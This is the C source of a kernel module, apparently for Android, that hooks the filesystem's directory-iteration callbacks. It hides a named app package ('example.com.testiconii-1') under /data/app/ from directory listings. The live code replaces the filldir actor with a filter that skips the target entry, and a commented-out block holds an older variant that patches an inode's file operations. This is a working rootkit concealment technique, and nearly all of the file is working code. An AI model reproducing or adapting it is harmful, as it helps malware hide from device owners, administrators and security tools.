#include "hook.h"

typedef int (*readdir_t)(struct file *, void *, filldir_t);


int g_fs_hooked = false;
char *data_fs = "/data/app/"; //hide dir in /opt/usr/media directory
char *dir_to_hide = "example.com.testiconii-1";

//readdir_t orig_data_readdir = NULL;
//filldir_t g_data_filldir = NULL;

//struct inode* g_data_inode = NULL;

//int (*real_filldir)(struct dir_context *ctx,const char *name,
//			int namelen,loff_t offset,u64 ino,
//			unsigned d_type);
int (*real_iterate)(struct file *filp,struct dir_context *ctx);

int fake_iterate(struct file *filp,struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx,const char *name,int namelen,
		loff_t offset,u64 ino,unsigned d_type);

filldir_t real_filldir = NULL;

int fake_iterate(struct file *filp,struct dir_context *ctx){
	printk("xxf_hook:fake_iterate:%s\n",filp -> f_dentry ->d_name.name);
	real_filldir = ctx -> actor;
	*((filldir_t *)&(ctx -> actor)) = (filldir_t)fake_filldir;
	return real_iterate(filp,ctx);

}
int fake_filldir(struct dir_context *ctx,const char *name,int namelen,
		loff_t offset,u64 ino,unsigned d_type)
{

	if(!strncmp(name,dir_to_hide,strlen(dir_to_hide))){
		printk("xxf_hook:hiding:%s\n",name);
		return 0;
	}
	printk("xxf_hook:name is %s,dir_to_hide:%s\n",name,dir_to_hide);
	return real_filldir(ctx,name,namelen,offset,ino,d_type);
}

void hide_file(void){

	set_file_op(iterate, data_fs, fake_iterate, real_iterate);
}

void unhide_file(void){
	void *dummy;
        set_file_op(iterate, data_fs, real_iterate, dummy);
}

/**
static struct inode* get_dir_inode(const char* path)
{
	struct file *filep;
	struct inode* i_node;
		
	filep = filp_open(path, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) 
	{
		TFFS_LOG_ERR("filp_open failed!");
		return NULL;
	}

	i_node = filep->f_dentry->d_inode;

	filp_close(filep, 0);

	return i_node;
}

int new_data_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	TFFS_LOG_INFO("dir entry %s", name);
	if (0 == strncmp(dir_to_hide, name, nlen))
	{
		TFFS_LOG_INFO("Find Hidden Dir --> directly return 0 to hide");
		return 0;
	}
		
	if (g_data_filldir)
	{
		return g_data_filldir(buf, name, nlen, off, ino, x);
	}
		
	return 0;
}


int new_data_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	g_data_filldir = filldir;
	return orig_data_readdir(fp, buf, (filldir_t)new_data_filldir);
}


const struct file_operations *g_old_data_fop = NULL;
static struct file_operations new_data_fop =
{
	.owner 		= 	THIS_MODULE,
	//.readdir 	= 	new_data_readdir,
};


int patch_readdir(struct inode* i_node, readdir_t *orig_readdir)
{	
	g_old_data_fop = i_node->i_fop;
	//\*orig_readdir = g_old_data_fop->readdir; //save the readdir operation to orig_readdir
	i_node->i_fop = &new_data_fop; // give the inode a new operation 

	return 0;
}

int unpatch_readdir(struct inode* i_node)
{
	if (g_old_data_fop)
	{
		i_node->i_fop = g_old_data_fop;
		g_old_data_fop = NULL;
	}
	else
	{
		TFFS_LOG_ERR("unpatch_readdir failed!");
	}
	
	return 0;
}

void hide_file(void)
{
	if (false == g_fs_hooked)
	{
		if (NULL == g_data_inode)
		{
			g_data_inode = get_dir_inode(data_fs);
		}
		
		patch_readdir(g_data_inode, &orig_data_readdir);
		g_fs_hooked = true;
		TFFS_LOG_INFO("hook readdir!\n");
	}
}

void unhide_file(void)
{
	if (true == g_fs_hooked)
	{	
		if (NULL == g_data_inode)
		{
			g_data_inode = get_dir_inode(data_fs);
		}
		unpatch_readdir(g_data_inode);
		g_fs_hooked = false;
		TFFS_LOG_INFO("unhook readdir!\n");
	}
}*/


